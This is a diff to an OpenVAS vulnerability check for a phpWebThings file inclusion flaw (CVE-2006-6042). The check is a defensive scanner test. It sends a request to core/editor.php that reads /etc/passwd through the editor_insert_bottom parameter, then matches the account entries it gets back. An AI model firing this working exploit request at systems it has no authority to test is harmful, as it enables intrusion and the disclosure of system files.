@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: phpwebthings_rfi.nasl 4489 2016-11-14 08:23:54Z teissa $
+# $Id: phpwebthings_rfi.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: phpWebThings editor_insert_bottom Parameter Remote File Include Vulnerability
 #
 # Authors:
@@ -41,84 +41,52 @@ tag_solution = "No patches or upgrades have been reported by the vendor at this 
 
 if(description)
 {
- # set script identifiers
-
- script_id(80078);;
- script_version("$Revision: 4489 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
- script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
- script_tag(name:"cvss_base", value:"6.8");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-
- script_cve_id("CVE-2006-6042");
- script_bugtraq_id(21178);
- script_xref(name:"OSVDB", value:"30503");
-
- name = "phpWebThings editor_insert_bottom Parameter Remote File Include Vulnerability";
- summary = "Tries to read a local file with phpWebThings";
- family = "Web application abuses";
-
- script_name(name);
-
- script_category(ACT_ATTACK);
+  script_id(80078);
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
+  script_tag(name:"cvss_base", value:"6.8");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2006-6042");
+  script_bugtraq_id(21178);
+  script_xref(name:"OSVDB", value:"30503");
+  script_name("phpWebThings editor_insert_bottom Parameter Remote File Include Vulnerability");
+  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
- script_copyright("This script is Copyright (C) 2006 Justin Seitz");
-
- script_family(family);
-
- script_dependencies("http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://milw0rm.com/exploits/2811");
- exit(0);
+  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
+  script_family("Web application abuses");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name : "solution" , value : tag_solution);
+  script_tag(name : "summary" , value : tag_summary);
+  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/2811");
+  exit(0);
 }
 
-
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-#
-# verify we can talk to the web server, if not exit
-#
-
-if(!get_port_state(port)) exit(0);
 if(!can_host_php(port:port)) exit(0);
-
-#
-# create list of directories to scan
-#
-
-
-# Loop through directories.
-dirs = make_list("/phpwebthings", "/webthings", "/phpwt", "/things", cgi_dirs());
-#
-# Iterate through the list
-#
 
 file = "/etc/passwd";
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/phpwebthings", "/webthings", "/phpwt", "/things", cgi_dirs( port:port ) ) ) {
 
-#
-#
-#       Attack: Attempt a file include of /etc/passwd
-#
-#
-  attackreq = http_get(item:string(dir, "/core/editor.php?editor_insert_bottom=", file),port:port);
-  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
-  if (attackres == NULL) exit(0);
-  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
-    string("main(", file, "): failed to open stream: No such file") >< attackres ||
-    "open_basedir restriction in effect. File(" >< attackres)   {
+  if( dir == "/" ) dir = "";
+
+  req = http_get(item:string(dir, "/core/editor.php?editor_insert_bottom=", file),port:port);
+  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+  if (res == NULL) continue;
+
+  if (egrep(pattern:"root:.*:0:[01]:", string:res) ||
+    string("main(", file, "): failed to open stream: No such file") >< res ||
+    "open_basedir restriction in effect. File(" >< res)   {
 
     passwd = "";
-    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))
-      passwd = egrep(pattern:"^[a-z_0-9$-]+:.*:[0-9]*:[0-9]*:.*:", string:attackres);
+    if (egrep(pattern:"root:.*:0:[01]:", string:res))
+      passwd = egrep(pattern:"^[a-z_0-9$-]+:.*:[0-9]*:[0-9]*:.*:", string:res);
 	
     if (passwd) {
       if (dir == "") dir = "/";
@@ -133,3 +101,4 @@ foreach dir (dirs) {
   }
 }
 
+exit( 99 );
